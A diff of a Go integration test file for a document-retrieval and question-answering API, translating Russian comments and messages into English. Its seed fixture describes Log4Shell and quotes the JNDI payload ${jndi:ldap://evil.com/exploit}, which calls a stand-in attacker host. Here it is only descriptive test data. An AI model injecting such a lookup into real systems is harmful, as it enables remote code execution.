@@ -1,11 +1,11 @@
 //go:build integration
 
-// Пакет tests содержит интеграционные тесты против запущенного API.
-// Перед запуском: поднять стек (`make up`), затем:
+// Package tests contains integration tests against the running API.
+// Before running: bring up the stack (`make up`), then:
 //
 //	go test -tags integration -v ./tests/
 //
-// URL API переопределяется переменной TEST_API_URL (по умолчанию http://localhost:8080).
+// API URL is overridden by the TEST_API_URL variable (default: http://localhost:8080).
 package tests
 
 import (
@@ -18,7 +18,7 @@ import (
 	"testing"
 )
 
-// log4jDoc — документ о Log4Shell, которым сидируется хранилище.
+// log4jDoc — document about Log4Shell used to seed the store.
 const log4jDoc = `{"title":"CVE-2021-44228","content":"Apache Log4j2 version 2.0-beta9 through 2.15.0 JNDI features used in error lookup, message interpolation, lookers, destination string of the Socket Appender and Socket Hub Appender, Redis destination of the Manager Appender, and Kafka appender allow an attacker to control log message interpolation by crafting JNDI lookup patterns like ${jndi:ldap://evil.com/exploit}. CVE-2021-44228 is also known as Log4Shell. The vulnerability allows remote code execution on affected systems."}`
 
 func apiURL() string {
@@ -28,7 +28,7 @@ func apiURL() string {
 	return "http://localhost:8080"
 }
 
-// postJSON отправляет POST-запрос с JSON-телом и возвращает статус и тело ответа.
+// postJSON sends a POST request with a JSON body and returns the status and response body.
 func postJSON(t *testing.T, path, body string) (int, []byte) {
 	t.Helper()
 	resp, err := http.Post(apiURL()+path, "application/json", strings.NewReader(body))
@@ -43,7 +43,7 @@ func postJSON(t *testing.T, path, body string) (int, []byte) {
 	return resp.StatusCode, b
 }
 
-// unmarshalObject декодирует JSON-тело в map.
+// unmarshalObject decodes a JSON body into a map.
 func unmarshalObject(t *testing.T, body []byte) map[string]interface{} {
 	t.Helper()
 	var parsed map[string]interface{}
@@ -61,7 +61,7 @@ func seedLog4jDocument(t *testing.T) {
 	}
 }
 
-// --- Тесты /api/v1/ask ---
+// --- Tests /api/v1/ask ---
 
 func TestAskSuccess(t *testing.T) {
 	seedLog4jDocument(t)
@@ -74,26 +74,26 @@ func TestAskSuccess(t *testing.T) {
 	resp := unmarshalObject(t, body)
 	answer, ok := resp["answer"].(string)
 	if !ok || !strings.Contains(strings.ToLower(answer), "log4") {
-		t.Errorf("answer не упоминает Log4Shell: %v", resp["answer"])
+		t.Errorf("answer does not mention Log4Shell: %v", resp["answer"])
 	}
 
 	sources, ok := resp["sources"].([]interface{})
 	if !ok {
-		t.Fatalf("sources не найден: %v", resp["sources"])
+		t.Fatalf("sources not found: %v", resp["sources"])
 	}
 	if len(sources) < 1 || len(sources) > 5 {
-		t.Errorf("sources = %d, want от 1 до 5", len(sources))
+		t.Errorf("sources = %d, want 1 to 5", len(sources))
 	}
 	for i, src := range sources {
 		sm, ok := src.(map[string]interface{})
 		if !ok {
-			t.Fatalf("source %d не объект: %v", i, src)
+			t.Fatalf("source %d is not an object: %v", i, src)
 		}
 		if _, hasTitle := sm["title"]; !hasTitle {
-			t.Errorf("source %d без title", i)
+			t.Errorf("source %d missing title", i)
 		}
 		if _, hasSnippet := sm["snippet"]; !hasSnippet {
-			t.Errorf("source %d без snippet", i)
+			t.Errorf("source %d missing snippet", i)
 		}
 	}
 }
@@ -106,11 +106,11 @@ func TestAskEmptyQuestion(t *testing.T) {
 	resp := unmarshalObject(t, body)
 	errObj, ok := resp["error"].(map[string]interface{})
 	if !ok || errObj["detail"] == nil {
-		t.Errorf("в теле ошибки нет error.detail: %s", body)
+		t.Errorf("error.detail missing in error body: %s", body)
 	}
 }
 
-// --- Тесты /api/v1/documents ---
+// --- Tests /api/v1/documents ---
 
 func TestDocumentsSuccess(t *testing.T) {
 	status, body := postJSON(t, "/api/v1/documents", log4jDoc)
@@ -122,7 +122,7 @@ func TestDocumentsSuccess(t *testing.T) {
 	docID, _ := resp["document_id"].(string)
 	uuidRe := regexp.MustCompile(`^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$`)
 	if !uuidRe.MatchString(docID) {
-		t.Errorf("document_id = %q, не UUID", docID)
+		t.Errorf("document_id = %q, not a UUID", docID)
 	}
 	if indexed, _ := resp["indexed"].(bool); !indexed {
 		t.Errorf("indexed = %v, want true", resp["indexed"])
